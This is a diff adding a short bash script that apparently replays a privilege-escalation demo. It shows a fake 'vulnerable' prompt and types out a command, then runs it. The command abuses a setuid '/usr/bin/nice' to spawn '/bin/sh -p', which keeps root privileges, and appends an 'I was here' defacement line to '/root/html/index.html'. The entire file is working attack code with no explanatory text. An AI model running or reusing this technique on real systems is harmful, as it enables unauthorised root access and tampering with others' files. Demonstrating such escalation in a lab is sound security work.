@@ -1,0 +1,7 @@
+#!/bin/bash
+
+echo -n "vulnerable:1> "
+sleep 1
+echo "/usr/bin/nice /bin/sh -p -c 'id; echo \"3. I was here ~ @szymex73\" >> /root/html/index.html'" | pv -qL 10 
+/usr/bin/nice /bin/sh -p -c 'id; echo "3. I was here ~ @szymex73" >> /root/html/index.html'
+exit
